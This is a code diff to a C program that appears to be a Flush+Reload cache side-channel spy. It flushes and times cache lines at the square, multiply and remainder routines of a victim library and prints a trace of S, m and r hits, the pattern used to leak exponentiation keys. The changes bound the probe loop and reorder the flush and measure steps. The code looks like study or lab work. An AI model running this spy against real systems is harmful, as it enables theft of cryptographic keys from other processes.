@@ -5,7 +5,7 @@
 #include <math.h>
 
 void do_something() {
-    for(int i=0;i < 450;i++) {
+    for(int i=0;i < 100;i++) {
         int j = i*2;
         j++;
     }
@@ -24,12 +24,17 @@ unsigned long long get_clflush_threshold (void *flush_addr) {
     volatile void *y = (volatile void *)flush_addr;
 
     for (int i = 0; i < NUM_ACCESSES; i++) {
-        if (i % 2 == 0)
+        if (i % 2 == 0){
             clflush((void *)y);
-        do_something();
+            //do_something();
+        }
+        else{
+        	measure_one_block_access_time((void*)y);
+        }
+
         access_times[i] = measure_one_block_access_time ((void *)y);
     }
-
+    
     qsort (access_times, NUM_ACCESSES, sizeof (long long), compare);
     for (int i = 0; i < NUM_ACCESSES; i++)
         if (i < (NUM_ACCESSES / 2))
@@ -65,20 +70,14 @@ int main() {
     m_addr = addr + multiply_add - base_add;
     r_addr = addr + remainder_add - base_add;
     // continuously probe the cache line
-    long long s = 0, m = 0, r = 0;
-    while (1) {
+    long long s = 0, m = 0, r = 0, i = 0;
+    while (i < 1000000) {
         unsigned long long atime;
-        clflush(s_addr);
-        do_something();
-        atime = measure_one_block_access_time ((void *) s_addr);
-        if (atime < THRESHOLD)
-        {
-            printf ("S");
-            s++;
-        }
 
         clflush(m_addr);
-        do_something();
+        clflush(r_addr);
+        clflush(s_addr);
+
         atime = measure_one_block_access_time ((void *) m_addr);
         if (atime < THRESHOLD)
         {
@@ -86,15 +85,23 @@ int main() {
             m++;
         }
 
-        clflush(r_addr);
-        do_something();
         atime = measure_one_block_access_time ((void *) r_addr);
         if (atime < THRESHOLD)
         {
             printf ("r");
+            //fflush(stdout);
             r++;
         }
-        /* printf ("%lld\n", s + m + r); */
+
+        atime = measure_one_block_access_time ((void *) s_addr);
+        if (atime < THRESHOLD)
+        {
+            printf ("S");
+            s++;
+        }
+        i++;
+        do_something();
     }
+    printf ("\n");
     return 0;
 }
